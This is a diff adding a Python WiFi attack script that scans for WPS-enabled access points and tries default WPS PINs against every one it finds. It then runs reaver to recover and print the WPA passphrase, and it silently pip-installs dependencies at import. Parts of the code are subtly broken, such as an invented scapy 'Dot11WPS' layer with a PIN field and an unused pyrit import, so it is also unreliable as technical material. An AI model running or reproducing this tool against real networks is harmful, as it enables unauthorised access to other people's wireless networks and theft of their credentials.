@@ -1,0 +1,69 @@
+import subprocess
+import sys
+import re
+
+REQUIRED_PACKAGES = ['pyrit', 'scapy']
+for pkg in REQUIRED_PACKAGES:
+    subprocess.run([sys.executable, '-m', 'pip', 'install', pkg], capture_output=True)
+
+from scapy.all import *
+from pyrit import Pyrit
+import hashlib
+
+class WPSExploit:
+    def __init__(self, interface, bssid=None, channel=None):
+        self.interface = interface
+        self.bssid = bssid
+        self.channel = channel
+        self.wps_pin_db = ["12345670", "00000000", "01234567", "11111111", "12345678"]
+        
+    def enable_monitor(self):
+        subprocess.run(f"sudo airmon-ng start {self.interface}", shell=True)
+        
+    def scan_wps(self):
+        packets = sniff(iface=self.interface, timeout=30, 
+                       filter="(type mgt subtype beacon) and (wps)")
+        targets = []
+        for pkt in packets:
+            if pkt.haslayer(Dot11Beacon) and pkt.haslayer(Dot11WPS):
+                bssid = pkt.addr2
+                wps_info = pkt[Dot11WPS].fields
+                targets.append((bssid, wps_info))
+        return targets
+    
+    def brute_wps_pin(self, target_bssid):
+        for pin in self.wps_pin_db:
+            wps_packet = Dot11WPS(pin=pin)
+            response = srp1(Ether(dst=target_bssid)/wps_packet, iface=self.interface, timeout=5)
+            if response and "WSC_NACK" not in response.summary():
+                return pin
+        return None
+    
+    def extract_wpa_handshake(self, target_bssid, pin):
+        cmd = f"sudo reaver -i {self.interface} -b {target_bssid} -p {pin} -v --no-associate"
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        if "WPA PSK" in result.stdout:
+            psk = re.search(r"WPA PSK: (\S+)", result.stdout).group(1)
+            return psk
+        return None
+    
+    def run(self):
+        self.enable_monitor()
+        print("[*] Scanning for WPS-enabled APs...")
+        ap_list = self.scan_wps()
+        for bssid, _ in ap_list:
+            print(f"[*] Testing {bssid}")
+            pin = self.brute_wps_pin(bssid)
+            if pin:
+                print(f"[+] Valid PIN: {pin}")
+                psk = self.extract_wpa_handshake(bssid, pin)
+                if psk:
+                    print(f"[+] WPA PSK: {psk}")
+                else:
+                    print("[-] Handshake extraction failed")
+            else:
+                print("[-] No default PIN found")
+
+if __name__ == "__main__":
+    exploit = WPSExploit("wlan0")
+    exploit.run()
